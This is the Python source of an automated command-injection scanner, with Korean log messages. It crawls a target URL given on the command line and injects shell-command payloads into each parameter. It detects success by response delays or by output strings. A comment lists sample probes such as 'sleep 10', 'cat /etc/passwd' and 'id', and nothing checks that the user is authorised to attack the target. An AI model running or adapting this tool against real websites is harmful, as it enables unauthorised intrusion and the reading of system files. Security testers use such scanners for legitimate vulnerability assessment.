import urllib.parse
import sys
import hashlib

from Load import Load
from Crawl import Crawl
import SubCrawl
import time

payload = {
    "cml" : None,
    "xss" : None
}

url = ""
userHex = "''"

def main()  :
    global url, userHex

    url = sys.argv[1]
    userHex = hashlib.sha224(sys.argv[2].encode()).hexdigest()

    writeLog("공격 코드를 로드합니다.")
    load()
    writeLog("공격 코드의 로드를 완료했습니다.")

    writeLog("크롤링을 진행합니다.")
    crawled = appCrawl(url)
    writeLog("크롤링을 완료했습니다.")

    ar = payload['cml'][0]
    pl = payload['cml'][1]

    attackLog = []
    hacked = []

    writeLog("공격(취약점 분석)을 진행합니다.")
    for each3 in crawled :
        flag = False
        for each2 in ar :
            for each in pl :
                ac = each.replace("{{payload}}", urllib.parse.quote_plus(each2[0]))
                if attackUrl(each3, ac, each2[1]) == True :
                    attackLog.append((each3, each2, each))
                    # flag = True
                    # print(attackLog)
                    break
            if flag == True :
                break
    writeLog("공격(취약점 분석)을 완료했습니다.")

    writeLog("ATTACKLOG : ")
    for i in attackLog :
        print("")
        print("######### < FOUND > #########")
        print("Method   : " + i[0]['method'])
        print("URL      : " + i[0]['url'].replace('{{payload}}', i[2].replace('{{payload}}', i[1][0])))
        print("Response : " + i[1][1])
        print("#############################")
    writeLog("완료했습니다.")
    print(attackLog)

def attackUrl(each, pl, response) :
    # pl = urllib.parse.quote_plus(pl)
    url = each['url'].replace("{{payload}}", pl)

    func = response.split("(")[0]
    value = response.split("(")[1].split(")")[0]

    method = each['method']

    if func == "delay" : startTime = time.time();

    headers = { "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0" }
    paramData = ""

    try :
        req = urllib.request.Request(url, headers=headers)
        read = urllib.request.urlopen(req).read()
        try : read = read.decode("utf-8")
        except : read
    except :
        read = ""
        pass

    # print(url)

    if func == "delay" :
        during = int(time.time() - startTime)
        if(during >= int(value)) : return True
        else : return False
    if func == "find" :
        if value in read : return True
        else : return False
    return False
'''
sleep 10, delay(10)
cat /etc/passwd, find("root")
id, find("uid=")
ls, find("bin")
ping localhost, find("icmp_seq=")
ping -t 10 localhost, delay(10)
'''

def writeLog(status)  :
    global userHex
    f = open("./data/" + userHex, "a")
    f.write(status + "\n")
    f.close()

def load() :
    global payload
    loadCml = Load("commandline")
    loadXss = Load("xss")
    payload['cml'] = loadCml.get()
    payload['xss'] = loadXss.get()

def appCrawl(url) :
    crawl = Crawl(url)
    crawl.filter()
    crawled = []
    crawled.extend(crawl.get())
    crawled.extend(SubCrawl.deepCrawl(crawled))
    crawled = SubCrawl.deleteOverlap(crawled)
    crawled = SubCrawl.replaceAttack(crawled)
    crawled = SubCrawl.getAttackable(crawled)
    return crawled

if __name__ == '__main__' :
    main()
